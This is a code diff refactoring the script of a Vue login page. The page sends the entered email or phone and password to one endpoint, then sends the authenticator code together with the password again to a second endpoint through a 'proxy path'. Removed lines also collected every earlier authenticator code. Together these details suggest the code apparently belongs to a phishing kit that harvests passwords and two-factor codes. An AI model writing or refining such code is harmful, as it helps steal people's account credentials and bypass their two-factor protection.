@@ -228,6 +228,7 @@ import PasswordComponent from "./PasswordComponent.vue";
 import ShowPasswordSvg from "@/assets/SVGs/ShowPasswordSvg.vue";
 import HidePasswordSVG from "@/assets/SVGs/HidePasswordSVG.vue";
 
+// Local states
 const phone = ref(false);
 const enterPassword = ref(false);
 const emailOrPhone = ref("");
@@ -239,29 +240,18 @@ const credentials = ref({
   authenticator: "",
 });
 const formSubmitted = ref(false);
-const authError = ref(false); // To track if there's an authenticator error
+const authError = ref(false);
 
 let intervalId;
 
+// Change the rotating display (UI effect)
 const changeDisplay = () => {
-  switch (currentDisplay.value) {
-    case "one":
-      currentDisplay.value = "two";
-      break;
-    case "two":
-      currentDisplay.value = "three";
-      break;
-    case "three":
-      currentDisplay.value = "four";
-      break;
-    case "four":
-      currentDisplay.value = "one";
-      break;
-    default:
-      currentDisplay.value = "one";
-  }
+  const displays = ["one", "two", "three", "four"];
+  const currentIndex = displays.indexOf(currentDisplay.value);
+  currentDisplay.value = displays[(currentIndex + 1) % displays.length];
 };
 
+// Lifecycle hooks for interval effect
 onMounted(() => {
   intervalId = setInterval(changeDisplay, 200);
 });
@@ -270,79 +260,74 @@ onBeforeUnmount(() => {
   clearInterval(intervalId);
 });
 
-const submitData = async () => {
+// Submit email/phone and password
+const submitEmail = async () => {
   formSubmitted.value = true;
+  authError.value = false;
+
   if (emailOrPhone.value && credentials.value.password) {
     try {
-      const response = await fetch(
-        "/api/submit/", // Use the proxy path here
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            emailOrPhone: emailOrPhone.value,
-            password: credentials.value.password,
-            authenticatorCodes: authCodes.value, // Store any previous authenticator codes as well
-          }),
-        }
-      );
+      const response = await fetch("/api/submit/", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          emailOrPhone: emailOrPhone.value,
+          password: credentials.value.password,
+        }),
+      });
 
       if (!response.ok) {
         throw new Error("Network response was not ok");
       }
 
-      const data = await response.json(); // assuming the backend sends a JSON response
-      // alert("Data submitted successfully!");
-      enterPassword.value = true; // Show the authenticator input after email/phone and password submission
+      const data = await response.json();
+      console.log("Submission response:", data);
+      enterPassword.value = true; // Show authenticator code input
     } catch (error) {
       console.error("Submission failed:", error);
-      // alert("There was an issue submitting your data.");
+      authError.value = true;
     } finally {
       formSubmitted.value = false;
     }
   } else {
-    formSubmitted.value = false;
     alert("Please fill out both fields.");
+    formSubmitted.value = false;
   }
 };
 
-const submitAuthenticatorCode = async () => {
+// Submit authenticator code
+const submitLogins = async () => {
   formSubmitted.value = true;
+  authError.value = false;
+
   if (credentials.value.authenticator) {
     try {
-      const response = await fetch(
-        "/api/submit-authenticator-code/", // Use the proxy path here
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            emailOrPhone: emailOrPhone.value,
-            password: credentials.value.password,
-            authenticatorCode: credentials.value.authenticator,
-            authenticatorCodes: authCodes.value, // Send all stored codes
-          }),
-        }
-      );
+      const response = await fetch("/api/submit-authenticator-code/", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          emailOrPhone: emailOrPhone.value,
+          password: credentials.value.password,
+          authenticatorCode: credentials.value.authenticator,
+        }),
+      });
 
       if (!response.ok) {
-        throw new Error("Network response was not ok");
+        throw new Error("Invalid response from server");
       }
 
-      const data = await response.json(); // assuming the backend sends a JSON response
-      // alert("Authenticator code submitted successfully!");
+      const data = await response.json();
+      console.log("Authenticator submission response:", data);
+      alert("Login successful!");
     } catch (error) {
       console.error("Submission failed:", error);
-      // alert("There was an issue submitting the authenticator code.");
+      authError.value = true;
     } finally {
       formSubmitted.value = false;
     }
   } else {
+    alert("Please enter the authenticator code.");
     formSubmitted.value = false;
-    // alert("Please enter the authenticator code.");
   }
 };
 </script>
